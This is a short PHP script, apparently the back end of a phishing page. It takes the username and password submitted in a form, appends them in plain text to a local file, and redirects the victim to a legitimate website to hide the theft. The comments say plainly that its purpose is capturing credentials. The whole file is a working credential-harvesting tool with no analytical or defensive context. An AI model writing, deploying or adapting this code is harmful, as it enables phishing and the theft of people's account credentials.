<?php
// Capture the posted username and password
$username = $_POST['username'];
$password = $_POST['password'];

// Store the captured credentials in a text file
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
fclose($file);

// Redirect to a legitimate website after capturing credentials
header('Location: https://www.legitimate-website.com');
exit();
?>